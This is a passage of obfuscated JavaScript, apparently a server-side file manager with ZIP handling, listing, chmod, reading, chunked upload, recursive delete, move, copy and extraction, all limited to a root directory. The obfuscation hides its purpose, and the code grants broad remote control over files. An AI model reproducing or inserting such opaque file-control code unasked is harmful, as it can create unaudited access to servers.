                return t[eD(0x3f9)](0x2014b50, 0x0), t['writeUInt16LE'](0x14, 0x4), t['writeUInt16LE'](0x14, 0x6), t[eD(0x5a2)](0x800, 0x8), t[eD(0x5a2)](o, 0xa), t['writeUInt16LE'](q, 0xc), t[eD(0x5a2)](r, 0xe), t['writeUInt32LE'](n, 0x10), t[eD(0x3f9)](p[eD(0xed)], 0x14), t[eD(0x3f9)](j[eD(0xed)], 0x18), t['writeUInt16LE'](m[eD(0xed)], 0x1c), t[eD(0x5a2)](0x0, 0x1e), t[eD(0x5a2)](0x0, 0x20), t[eD(0x5a2)](0x0, 0x22), t[eD(0x5a2)](0x0, 0x24), t['writeUInt32LE'](l ? 0x10 : 0x0, 0x26), t['writeUInt32LE'](f, 0x2a), d['push'](t, m), f += b['ZrMqU'](b[eD(0x6a3)](0x1e, m[eD(0xed)]), p[eD(0xed)]), g++, !![];
            },
            'close'() {
                const eE = eB, i = Buffer['concat'](d), j = Buffer[eE(0x9e7)](0x16);
                return j[eE(0x3f9)](0x6054b50, 0x0), j[eE(0x5a2)](0x0, 0x4), j[eE(0x5a2)](0x0, 0x6), j['writeUInt16LE'](g, 0x8), j['writeUInt16LE'](g, 0xa), j[eE(0x3f9)](i['length'], 0xc), j['writeUInt32LE'](f, 0x10), j[eE(0x5a2)](0x0, 0x14), b[eE(0x23e)](h, i), b[eE(0x23e)](h, j), a0l[eE(0xd13)](c), g;
            }
        };
    }
    static [a0ch(0x418)](a) {
        const eF = a0ch, b = {
                'VPfMu': function (n, o) {
                    return n - o;
                },
                'lCFxy': function (n, o) {
                    return n + o;
                },
                'nriTG': function (n, o) {
                    return n >= o;
                },
                'Jgezd': function (n, o) {
                    return n === o;
                },
                'zLKgb': function (n, o) {
                    return n < o;
                },
                'zubKG': function (n, o) {
                    return n + o;
                },
                'Mvrye': function (n, o) {
                    return n + o;
                },
                'Pcqha': function (n, o) {
                    return n + o;
                },
                'MFEwW': function (n, o) {
                    return n <= o;
                },
                'lgknC': function (n, o) {
                    return n !== o;
                },
                'fRlVU': function (n, o) {
                    return n + o;
                },
                'vELLd': function (n, o) {
                    return n + o;
                },
                'GyjOZ': function (n, o) {
                    return n + o;
                },
                'sguqi': function (n, o) {
                    return n + o;
                },
                'lTVzT': function (n, o) {
                    return n + o;
                },
                'ioYHH': function (n, o) {
                    return n + o;
                },
                'QSKdR': function (n, o) {
                    return n + o;
                },
                'jonyD': function (n, o) {
                    return n + o;
                },
                'xSbFf': function (n, o) {
                    return n + o;
                },
                'OBKHn': function (n, o) {
                    return n + o;
                },
                'MxjYy': eF(0xc74),
                'VokGC': function (n, o) {
                    return n & o;
                },
                'lASKT': function (n, o) {
                    return n !== o;
                },
                'mNOQf': function (n, o) {
                    return n & o;
                },
                'XKcuz': function (n, o) {
                    return n === o;
                },
                'auPvl': function (n, o) {
                    return n + o;
                },
                'oLzAj': function (n, o) {
                    return n === o;
                },
                'vOhPk': function (n, o) {
                    return n + o;
                },
                'QPlwj': function (n, o) {
                    return n <= o;
                }
            }, c = a0l[eF(0x8fc)](a);
        let d = -0x1;
        const f = Math['max'](0x0, b['VPfMu'](c['length'], b[eF(0x52c)](0xffff, 0x16)));
        for (let n = b[eF(0xa16)](c[eF(0xed)], 0x16); b[eF(0x66d)](n, f); n--) {
            if (b[eF(0x334)](c[eF(0xc38)](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b[eF(0x94f)](d, 0x0))
            throw new Error('Not\x20a\x20zip\x20file');
        const g = c['readUInt16LE'](b['zubKG'](d, 0xa)), h = c[eF(0xc38)](b[eF(0xea)](d, 0xc)), j = c[eF(0xc38)](b[eF(0xa89)](d, 0x10)), k = [];
        let l = j;
        const m = b['Pcqha'](j, h);
        for (let o = 0x0; o < g && b['MFEwW'](b['lCFxy'](l, 0x2e), m); o++) {
            if (b['lgknC'](c['readUInt32LE'](l), 0x2014b50))
                break;
            const q = c[eF(0x770)](b[eF(0x22e)](l, 0x8)), r = c[eF(0x770)](b[eF(0x780)](l, 0xa)), s = c['readUInt32LE'](b[eF(0xea)](l, 0x10)), t = c[eF(0xc38)](b[eF(0xbff)](l, 0x14)), u = c[eF(0xc38)](b[eF(0x97e)](l, 0x18)), v = c[eF(0x770)](b[eF(0xd62)](l, 0x1c)), w = c['readUInt16LE'](b[eF(0x6a1)](l, 0x1e)), x = c[eF(0x770)](b['ioYHH'](l, 0x20)), y = c[eF(0xc38)](b[eF(0x25a)](l, 0x26)), z = c[eF(0xc38)](b[eF(0x2fd)](l, 0x2a)), A = c[eF(0x88a)](b[eF(0x235)](l, 0x2e), b['OBKHn'](l, 0x2e) + v)[eF(0x1d9)](b[eF(0x78a)]);
            l += b[eF(0x5fe)](b[eF(0x780)](b['xSbFf'](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A['endsWith']('/') || b[eF(0xb57)](b['VokGC'](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[eF(0x1c7)](b['mNOQf'](q, 0x1), 0x0),
                'zip64': b[eF(0x334)](t, 0xffffffff) || b[eF(0x499)](u, 0xffffffff) || z === 0xffffffff,
                'data': null
            };
            if (!B['isDir'] && !B[eF(0x821)] && !B['zip64']) {
                if (b['MFEwW'](b['auPvl'](z, 0x1e), c['length']) && b['oLzAj'](c[eF(0xc38)](z), 0x4034b50)) {
                    const C = c[eF(0x770)](z + 0x1a), D = c[eF(0x770)](b[eF(0x5fe)](z, 0x1c)), E = b[eF(0x780)](b[eF(0x515)](b[eF(0xa89)](z, 0x1e), C), D);
                    b[eF(0x39e)](E + t, c[eF(0xed)]) && (B[eF(0x649)] = c[eF(0x88a)](E, b[eF(0xd62)](E, t)));
                }
            }
            k[eF(0x77f)](B);
        }
        return k;
    }
    static [a0ch(0xa7d)](a) {
        const eG = a0ch, b = {
                'BqNps': function (c, d) {
                    return c === d;
                }
            };
        if (b[eG(0x2e8)](a['method'], 0x0))
            return a['data'];
        if (a['method'] === 0x8)
            return a0n[eG(0x667)](a[eG(0x649)]);
        throw new Error(eG(0xb9c) + a[eG(0x5bd)]);
    }
}
class a0ag {
    static async [a0ch(0x322)](a, b = ![]) {
        const eH = a0ch, c = {
                'AjzHq': 'directory',
                'RWiXa': eH(0x8e2),
                'WCUGD': function (h, i) {
                    return h & i;
                },
                'qZsiq': function (h, i) {
                    return h(i);
                },
                'BVBMa': function (h, i) {
                    return h || i;
                },
                'RUWcV': function (h, i) {
                    return h(i);
                },
                'sWvui': eH(0x441),
                'qzyPg': eH(0x4f5)
            }, d = a0o['resolve'](a0a1[eH(0x229)], c[eH(0x2b9)](a, '.'));
        if (!c['RUWcV'](a0ae, d))
            throw new Error(c[eH(0x184)]);
        if (!a0l['existsSync'](d))
            throw new Error(c[eH(0xcb3)]);
        const f = [], g = h => {
                const eI = eH, i = a0l[eI(0x639)](h);
                for (const j of i) {
                    const k = a0o['join'](h, j), l = a0l[eI(0x4e2)](k), m = new a0X();
                    m[eI(0x1d4)] = j, m[eI(0x4ac)] = a0o[eI(0x65c)](a0a1[eI(0x229)], k), m['type'] = l[eI(0x60e)]() ? c[eI(0x166)] : c[eI(0xa7e)], m[eI(0x677)] = l[eI(0x677)], m[eI(0x325)] = l['mtime'][eI(0x774)](), m[eI(0x2f3)] = this[eI(0x105)](l[eI(0x2f3)], l['isDirectory']()), m[eI(0xc2e)] = '0o' + c[eI(0x33d)](l['mode'], 0x1ff)[eI(0x1d9)](0x8), m[eI(0x9a7)] = l[eI(0xd46)] + ':' + l[eI(0x7cc)], f[eI(0x77f)](m), b && l[eI(0x60e)]() && c[eI(0x443)](g, k);
                }
            };
        return c[eH(0x7f7)](g, d), f;
    }
    static async [a0ch(0xb8e)](a) {
        const eJ = a0ch, b = {
                'oMXdY': function (d, f) {
                    return d & f;
                },
                'NikKl': 'directory',
                'Fdmpb': eJ(0x8e2)
            }, c = [];
        for (const d of a) {
            const f = a0o[eJ(0x6ad)](a0a1[eJ(0x229)], d);
            if (!a0ae(f))
                continue;
            try {
                const g = a0l['statSync'](f), h = this[eJ(0x6f3)](f, a0l['constants'][eJ(0xba4)]), i = this[eJ(0x6f3)](f, a0l['constants'][eJ(0xb8b)]), j = this[eJ(0x6f3)](f, a0l[eJ(0x6aa)]['X_OK']), k = new a0Y();
                k[eJ(0x4ac)] = a0o[eJ(0x65c)](a0a1['FILE_ROOT'], f), k['name'] = a0o[eJ(0xcef)](f), k[eJ(0x2f3)] = this['_formatMode'](g[eJ(0x2f3)], g[eJ(0x60e)]()), k[eJ(0xc2e)] = '0o' + b[eJ(0x581)](g['mode'], 0x1ff)['toString'](0x8), k[eJ(0x430)] = g[eJ(0x60e)]() ? b[eJ(0x764)] : b[eJ(0x181)], k[eJ(0x87d)] = h, k[eJ(0x67d)] = i, k[eJ(0x2a9)] = j, c[eJ(0x77f)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0ch(0x6f3)](a, b) {
        const eK = a0ch;
        try {
            return a0l[eK(0x57d)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0ch(0xbfc)](a) {
        const eL = a0ch, b = {
                'Bdcug': function (c, d) {
                    return c === d;
                },
                'vkdnF': function (c, d) {
                    return c === d;
                },
                'kSwiY': eL(0x9be),
                'ikmqj': function (c, d, f) {
                    return c(d, f);
                },
                'fvnsc': eL(0xcc3)
            };
        if (b['Bdcug'](typeof a, 'number'))
            return a;
        if (b[eL(0xd35)](typeof a, b['kSwiY'])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[eL(0x8d7)](c))
                return b['ikmqj'](parseInt, c, 0x8);
        }
        throw new Error(b['fvnsc']);
    }
    static [a0ch(0x105)](a, b) {
        const eM = a0ch, c = b ? 'd' : '-', d = [
                'r',
                'w',
                'x'
            ], f = (a & 0x1ff)['toString'](0x8)[eM(0x8fb)](0x3, '0');
        let g = c;
        for (const h of f) {
            const i = parseInt(h, 0xa);
            g += d[eM(0x51f)]((j, k) => i & 0x4 >> k ? j : '-')[eM(0xaa7)]('');
        }
        return g;
    }
    static async [a0ch(0x42f)](a, b = ![]) {
        const eN = a0ch, c = {
                'GPGFy': function (g, h) {
                    return g(h);
                },
                'wzoZz': function (g, h) {
                    return g(h);
                },
                'TZNDN': function (g, h) {
                    return g(h);
                },
                'HLyHB': function (g, h) {
                    return g(h);
                },
                'FErZH': function (g, h) {
                    return g(h);
                },
                'DtVwX': eN(0xb4f)
            }, d = [];
        for (const [g, h] of Object[eN(0x1e9)](a)) {
            const i = a0o[eN(0x6ad)](a0a1[eN(0x229)], g);
            if (!c[eN(0x59f)](a0ae, i)) {
                d['push']({
                    'path': g,
                    'requested': c[eN(0x263)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                const j = this['_parseMode'](h), k = m => {
                        const eO = eN;
                        a0l[eO(0x3f0)](m, j);
                    };
                if (b && a0l['existsSync'](i) && a0l[eN(0x4e2)](i)[eN(0x60e)]()) {
                    const m = n => {
                        const eP = eN;
                        c[eP(0x263)](k, n);
                        const o = a0l[eP(0x639)](n);
                        for (const p of o) {
                            const q = a0o[eP(0xaa7)](n, p);
                            a0l[eP(0x4e2)](q)['isDirectory']() ? c[eP(0x386)](m, q) : c[eP(0x386)](k, q);
                        }
                    };
                    c[eN(0x386)](m, i);
                } else
                    c['HLyHB'](k, i);
                const l = j[eN(0x1d9)](0x8);
                d[eN(0x77f)]({
                    'path': g,
                    'requested': c[eN(0x6a2)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[eN(0x77f)]({
                    'path': g,
                    'requested': c[eN(0x431)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[eN(0x84f)],
                    'message': n[eN(0x8f9)]
                });
            }
        }
        const f = d[eN(0x29a)](o => o['status'] === 'ok')[eN(0xed)];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0ch(0x714)](a) {
        const eQ = a0ch, b = {
                'RNihc': function (h, i) {
                    return h(i);
                },
                'ERaoc': 'Access\x20denied:\x20path\x20outside\x20root',
                'BjMGc': function (h, i) {
                    return h > i;
                },
                'GJcwh': function (h, i) {
                    return h * i;
                },
                'eCZOq': eQ(0x7fa),
                'Iiare': eQ(0xc74),
                'XpbaG': eQ(0x5ad)
            }, c = a0o[eQ(0x6ad)](a0a1[eQ(0x229)], a);
        if (!b[eQ(0xec)](a0ae, c))
            throw new Error(b[eQ(0xcd4)]);
        const d = a0l[eQ(0x4e2)](c);
        if (b[eQ(0x896)](d[eQ(0x677)], b[eQ(0xc37)](0x400, 0x400)))
            throw new Error(b[eQ(0x8cb)]);
        const f = a0l[eQ(0x8fc)](c), g = this['_isBinary'](f);
        return {
            'status': 'ok',
            'path': a0o[eQ(0x65c)](a0a1[eQ(0x229)], c),
            'content': g ? a0w[eQ(0x60d)](f) : f[eQ(0x1d9)](b[eQ(0x704)]),
            'encoding': g ? eQ(0xd18) : b[eQ(0x7c6)],
            'is_binary': g,
            'size': d['size']
        };
    }
    static [a0ch(0x309)](a) {
        const eR = a0ch, b = {
                'UNBTL': function (c, d) {
                    return c === d;
                },
                'mcsJH': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b[eR(0x267)](a['length'], 0x0))
            return ![];
        for (let c = 0x0; b[eR(0x1cb)](c, Math[eR(0x2dc)](a[eR(0xed)], 0x200)); c++) {
            if (b[eR(0x267)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0ch(0x761)](a, b, c, d = null, f = null) {
        const eS = a0ch, g = {
                'XHdxy': eS(0x441),
                'RYZZJ': function (l, m) {
                    return l > m;
                },
                'igLUe': 'File\x20too\x20large',
                'zfbgv': function (l, m) {
                    return l !== m;
                },
                'mPoTm': function (l, m) {
                    return l(m);
                },
                'eKOZk': function (l, m) {
                    return l(m);
                },
                'AeqPP': eS(0xc47),
                'NVXen': '.upload_chunks',
                'ixaFl': function (l, m) {
                    return l === m;
                },
                'APRZC': function (l, m) {
                    return l < m;
                }
            }, h = a0o[eS(0x6ad)](a0a1[eS(0x229)], a);
        let j = h;
        b && (j = a0o[eS(0xaa7)](h, b));
        if (!a0ae(j))
            throw new Error(g[eS(0x4df)]);
        !a0l[eS(0x8d6)](a0o[eS(0x651)](j)) && a0l[eS(0x4a9)](a0o[eS(0x651)](j), { 'recursive': !![] });
        const k = a0w[eS(0xb72)](c);
        if (g['RYZZJ'](k[eS(0xed)], a0a1[eS(0x7d0)]))
            throw new Error(g[eS(0x210)]);
        if (g['zfbgv'](d, null) && f !== null) {
            const l = g[eS(0xd5a)](Number, d), m = g[eS(0x919)](Number, f);
            if (Number[eS(0xbb1)](l) || Number['isNaN'](m))
                throw new Error(g[eS(0xbcc)]);
            const n = a0o[eS(0xaa7)](a0o['dirname'](j), g[eS(0x859)], a0o[eS(0xcef)](j));
            !a0l[eS(0x8d6)](n) && a0l[eS(0x4a9)](n, { 'recursive': !![] });
            const o = a0o[eS(0xaa7)](n, eS(0x789) + l);
            a0l[eS(0x134)](o, k);
            const p = a0l[eS(0x639)](n)[eS(0x29a)](s => s[eS(0xc9b)](eS(0x789))), q = p[eS(0xed)], r = g[eS(0x7b9)](q, m);
            if (r) {
                const s = a0l[eS(0x91b)](j);
                for (let u = 0x0; g[eS(0x880)](u, m); u++) {
                    const v = a0o[eS(0xaa7)](n, eS(0x789) + u);
                    if (!a0l[eS(0x8d6)](v)) {
                        s[eS(0x4f7)]();
                        throw new Error('Missing\x20chunk\x20' + u);
                    }
                    s[eS(0x92a)](a0l[eS(0x8fc)](v));
                }
                s[eS(0xa40)]();
                const t = a0o[eS(0x651)](n);
                a0l[eS(0x12d)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o['relative'](a0a1[eS(0x229)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[eS(0x134)](j, k), {
            'status': 'ok',
            'path': a0o[eS(0x65c)](a0a1[eS(0x229)], j),
            'received': k[eS(0xed)],
            'total': k[eS(0xed)],
            'chunked': ![]
        };
    }
    static async [a0ch(0x663)](a, b, c, d = null, f = null) {
        const eT = a0ch, g = {
                'vILgK': function (k, l) {
                    return k || l;
                },
                'ZJliY': 'Access\x20denied:\x20path\x20outside\x20root',
                'mSvEc': function (k, l) {
                    return k > l;
                },
                'BMvTB': eT(0x7fa),
                'bkVLM': function (k, l) {
                    return k !== l;
                },
                'cTKwm': function (k, l) {
                    return k !== l;
                },
                'hAhOB': function (k, l) {
                    return k(l);
                },
                'ZkLWC': function (k, l) {
                    return k(l);
                },
                'LcDpI': eT(0xc47),
                'hzfPj': eT(0x90b),
                'ZIjme': function (k, l) {
                    return k < l;
                },
                'jGRKs': 'All\x20chunks\x20received.\x20File\x20merged\x20successfully.',
                'TpLos': eT(0x811)
            }, h = a0o[eT(0x6ad)](a0a1[eT(0x229)], g[eT(0x614)](a, '.'));
        let j = h;
        b && (j = a0o[eT(0xaa7)](h, b));
        if (!a0ae(j))
            throw new Error(g[eT(0x9c2)]);
        !a0l[eT(0x8d6)](a0o[eT(0x651)](j)) && a0l[eT(0x4a9)](a0o[eT(0x651)](j), { 'recursive': !![] });
        if (g[eT(0x22a)](c[eT(0xed)], a0a1[eT(0x7d0)]))
            throw new Error(g['BMvTB']);
        if (g[eT(0xad9)](d, null) && g[eT(0xbc9)](f, null)) {
            const k = g[eT(0x442)](Number, d), l = g[eT(0x706)](Number, f);
            if (Number['isNaN'](k) || Number[eT(0xbb1)](l))
                throw new Error(g[eT(0x24d)]);
            const m = a0o[eT(0xaa7)](a0o[eT(0x651)](j), g['hzfPj'], a0o[eT(0xcef)](j));
            !a0l['existsSync'](m) && a0l[eT(0x4a9)](m, { 'recursive': !![] });
            const n = a0o['join'](m, eT(0x789) + k);
            a0l[eT(0x134)](n, c);
            const o = a0l['readdirSync'](m)[eT(0x29a)](r => r[eT(0xc9b)](eT(0x789))), p = o['length'], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g[eT(0x1ac)](t, l); t++) {
                    const u = a0o['join'](m, eT(0x789) + t);
                    if (!a0l[eT(0x8d6)](u))
                        throw new Error(eT(0x3ca) + t);
                    r[eT(0x77f)](a0l[eT(0x8fc)](u));
                }
                a0l[eT(0x134)](j, Buffer[eT(0x653)](r));
                const s = a0o[eT(0x651)](m);
                a0l['rmSync'](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[eT(0xa01)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o['relative'](a0a1['FILE_ROOT'], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g['jGRKs']
                };
            }
            return {
                'status': 'ok',
                'path': a0o[eT(0x65c)](a0a1[eT(0x229)], j),
                'chunk_id': k,
                'completed': ![],
                'message': eT(0xbb7) + k + '\x20uploaded.\x20Waiting\x20for\x20remaining\x20blocks.'
            };
        }
        return a0l['writeFileSync'](j, c), {
            'status': 'ok',
            'path': a0o[eT(0x65c)](a0a1[eT(0x229)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[eT(0x616)]
        };
    }
    static async [a0ch(0xccc)](a) {
        const eU = a0ch, b = {
                'EWCEb': function (g, h) {
                    return g(h);
                },
                'eiBCK': eU(0x441)
            }, c = a0o['resolve'](a0a1[eU(0x229)], a);
        if (!b['EWCEb'](a0ae, c))
            throw new Error(b[eU(0xc33)]);
        if (!a0l['existsSync'](c))
            throw new Error(eU(0x45a));
        const d = a0l[eU(0x4e2)](c), f = await a0l[eU(0x5ac)]['readFile'](c);
        return {
            'path': a0o[eU(0x65c)](a0a1[eU(0x229)], c),
            'content': f,
            'size': d[eU(0x677)]
        };
    }
    static async [a0ch(0xb09)](a) {
        const eV = a0ch, b = {
                'eFWpA': function (d, f) {
                    return d(f);
                },
                'xuXvB': eV(0x750),
                'UhBNR': 'not_found',
                'txhSt': eV(0xb4f)
            }, c = [];
        for (const d of a) {
            const f = a0o[eV(0x6ad)](a0a1[eV(0x229)], d);
            if (!b[eV(0x981)](a0ae, f)) {
                c[eV(0x77f)]({
                    'path': d,
                    'status': eV(0x92f)
                });
                continue;
            }
            try {
                if (a0l[eV(0x8d6)](f)) {
                    const g = a0l[eV(0x4e2)](f);
                    g[eV(0x60e)]() ? a0l[eV(0x12d)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c[eV(0x77f)]({
                        'path': d,
                        'status': b[eV(0x280)]
                    });
                } else
                    c[eV(0x77f)]({
                        'path': d,
                        'status': b[eV(0xd14)]
                    });
            } catch (h) {
                c[eV(0x77f)]({
                    'path': d,
                    'status': b[eV(0x7e0)],
                    'message': h[eV(0x8f9)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const eW = a0ch, b = { 'ofYyF': 'access_denied' }, c = [];
        for (const [d, f] of Object[eW(0x1e9)](a)) {
            const g = a0o['resolve'](a0a1[eW(0x229)], d), h = a0o['resolve'](a0a1['FILE_ROOT'], f);
            if (!a0ae(g) || !a0ae(h)) {
                c[eW(0x77f)]({
                    'from': d,
                    'to': f,
                    'status': b['ofYyF']
                });
                continue;
            }
            try {
                const i = a0o[eW(0x651)](h);
                !a0l[eW(0x8d6)](i) && a0l[eW(0x4a9)](i, { 'recursive': !![] }), a0l[eW(0x6e0)](g, h), c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[eW(0x77f)]({
                    'from': d,
                    'to': f,
                    'status': eW(0xb4f),
                    'message': j[eW(0x8f9)]
                });
            }
        }
        return c;
    }
    static async [a0ch(0x289)](a) {
        const eX = a0ch, b = {
                'KyajX': function (d, f, g) {
                    return d(f, g);
                },
                'uGvWF': function (d, f) {
                    return d(f);
                },
                'pFXkD': eX(0x92f),
                'TBtSL': eX(0x5dd)
            }, c = [];
        for (const [d, f] of Object[eX(0x1e9)](a)) {
            const g = a0o[eX(0x6ad)](a0a1['FILE_ROOT'], d), h = a0o[eX(0x6ad)](a0a1['FILE_ROOT'], f);
            if (!b[eX(0x7d8)](a0ae, g) || !a0ae(h)) {
                c[eX(0x77f)]({
                    'from': d,
                    'to': f,
                    'status': b[eX(0xaba)]
                });
                continue;
            }
            try {
                if (!a0l[eX(0x8d6)](g)) {
                    c[eX(0x77f)]({
                        'from': d,
                        'to': f,
                        'status': b[eX(0x498)]
                    });
                    continue;
                }
                const i = a0o[eX(0x651)](h);
                !a0l[eX(0x8d6)](i) && a0l[eX(0x4a9)](i, { 'recursive': !![] });
                const j = a0l[eX(0x4e2)](g);
                if (j[eX(0x60e)]()) {
                    if (a0l[eX(0xc2a)])
                        a0l[eX(0xc2a)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const eY = eX;
                            if (a0l[eY(0x4e2)](l)[eY(0x60e)]()) {
                                if (!a0l[eY(0x8d6)](m))
                                    a0l[eY(0x4a9)](m, { 'recursive': !![] });
                                for (const n of a0l[eY(0x639)](l)) {
                                    b[eY(0xb8d)](k, a0o['join'](l, n), a0o[eY(0xaa7)](m, n));
                                }
                            } else
                                a0l[eY(0x3fc)](l, m);
                        };
                        k(g, h);
                    }
                } else
                    a0l[eX(0x3fc)](g, h);
                c[eX(0x77f)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': eX(0xb4f),
                    'message': l[eX(0x8f9)]
                });
            }
        }
        return c;
    }
    static async [a0ch(0x539)](a) {
        const eZ = a0ch, b = {
                'Wnotn': function (d, f) {
                    return d(f);
                }
            }, c = a0o[eZ(0x6ad)](a0a1[eZ(0x229)], a);
        if (!b[eZ(0xc2c)](a0ae, c))
            throw new Error(eZ(0x441));
        return a0l[eZ(0x4a9)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[eZ(0x65c)](a0a1[eZ(0x229)], c)
        };
    }
    static [a0ch(0x4cb)](a) {
        return a0o['relative'](a0a1['FILE_ROOT'], a) || '.';
    }
    static async [a0ch(0xa18)](a, b, c = ![]) {
        const f0 = a0ch, d = {
                'dmgdp': function (k, l, m) {
                    return k(l, m);
                },
                'LxOkx': 'path\x20required',
                'kgFdA': function (k, l) {
                    return k === l;
                },
                'zSdBH': f0(0x11b),
                'nRPkj': function (k, l) {
                    return k(l);
                },
                'lnbXH': f0(0x441),
                'fvGVt': f0(0x42c),
                'aAcGc': function (k, l) {
                    return k || l;
                },
                'SQSym': f0(0xb4f),
                'cPgtU': 'not_found',
                'SzIXy': f0(0x7c8)
            };
        if (!a)
            throw new Error(d['LxOkx']);
        if (!Array[f0(0x595)](b) || d['kgFdA'](b[f0(0xed)], 0x0))
            throw new Error(d[f0(0x4d4)]);
        const f = a0o[f0(0x6ad)](a0a1[f0(0x229)], a);
        if (!d['nRPkj'](a0ae, f))
            throw new Error(d[f0(0x551)]);
        if (a0l[f0(0x8d6)](f) && a0l[f0(0x4e2)](f)[f0(0x60e)]())
            throw new Error(f0(0x893) + a);
        a0l[f0(0x4a9)](a0o['dirname'](f), { 'recursive': !![] });
        if (a0l['existsSync'](f))
            a0l[f0(0xb05)](f);
        const g = a0af['openWriter'](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h[f0(0x77f)]({
                    'item': k,
                    'status': d[f0(0x898)],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[f0(0x6ad)](a0a1[f0(0x229)], d['aAcGc'](k, ''));
            try {
                if (!d[f0(0x760)](a0ae, l)) {
                    h[f0(0x77f)]({
                        'item': k,
                        'status': d[f0(0x104)],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[f0(0x8d6)](l)) {
                    h[f0(0x77f)]({
                        'item': k,
                        'status': d[f0(0x4b2)],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[f0(0x4e2)](l);
                let n = 0x0, o = ![];
                if (m['isFile']()) {
                    if (!g[f0(0x84a)](a0o[f0(0xcef)](l), a0l[f0(0x8fc)](l), m[f0(0x325)])) {
                        j = !![], h[f0(0x77f)]({
                            'item': k,
                            'status': d[f0(0x898)],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m['isDirectory']()) {
                        const p = a0o['basename'](l), q = (r, s) => {
                                const f1 = f0;
                                for (const t of a0l['readdirSync'](r)) {
                                    const u = a0o[f1(0xaa7)](r, t), v = s ? s + '/' + t : t, w = a0l[f1(0x4e2)](u);
                                    if (w[f1(0x60e)]()) {
                                        if (!g[f1(0x84a)](v + '/', Buffer[f1(0x9e7)](0x0), w[f1(0x325)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d[f1(0x94c)](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[f1(0xbdd)]()) {
                                            if (!g[f1(0x84a)](v, a0l[f1(0x8fc)](u), w[f1(0x325)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d[f0(0x94c)](q, l, c ? '' : p);
                    } else {
                        h['push']({
                            'item': k,
                            'status': d[f0(0x104)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[f0(0x77f)]({
                        'item': k,
                        'status': d[f0(0x33c)],
                        'added': n
                    });
                    continue;
                }
                i += n, h['push']({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h['push']({
                    'item': k,
                    'status': d[f0(0x104)],
                    'added': 0x0
                });
            }
        }
        return g[f0(0x4f7)](), {
            'status': 'ok',
            'path': a0ag[f0(0x4cb)](f),
            'entries': i,
            'size': a0l[f0(0x8d6)](f) ? a0l[f0(0x4e2)](f)[f0(0x677)] : 0x0,
            'results': h
        };
    }
    static async ['unzipArchive'](a, b, c = !![], d = null) {
        const f2 = a0ch, f = {
                'FLGOv': f2(0x461),
                'LFZcp': function (p, q) {
                    return p(q);
                },
                'jICqY': f2(0x441),
                'yWxbY': function (p, q) {
                    return p >= q;
                },
                'lOibH': function (p, q) {
                    return p + q;
                },
                'mdWnE': function (p, q) {
                    return p > q;
                },
                'lnlfn': function (p, q) {
                    return p(q);
                },
                'kchHu': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f[f2(0x389)]);
        const g = a0o[f2(0x6ad)](a0a1[f2(0x229)], a);
        if (!f['LFZcp'](a0ae, g))
            throw new Error(f[f2(0x19f)]);
        if (!a0l[f2(0x8d6)](g))
            throw new Error('Zip\x20not\x20found:\x20' + a);
        if (a0l['statSync'](g)[f2(0x60e)]())
            throw new Error(f2(0x5d4) + a);
        let h;
        if (b) {
            h = a0o[f2(0x6ad)](a0a1[f2(0x229)], b);
            if (!f['LFZcp'](a0ae, h))
                throw new Error('Access\x20denied:\x20path\x20outside\x20root');
            if (a0l[f2(0x8d6)](h) && !a0l[f2(0x4e2)](h)['isDirectory']())
                throw new Error('Destination\x20is\x20a\x20file:\x20' + b);
        } else
            h = a0o[f2(0x651)](g);
        a0l[f2(0x4a9)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0af[f2(0x418)](g);
        } catch (p) {
            throw new Error('Not\x20a\x20zip\x20file:\x20' + a);
        }
        const j = (d || [])[f2(0x29a)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q['isDir'])
                continue;
            if (f['yWxbY'](f['lOibH'](k, l), a0af['ZIP_MAX_ENTRIES']) || m >= a0af[f2(0xca7)]) {
                l++;
                continue;
            }
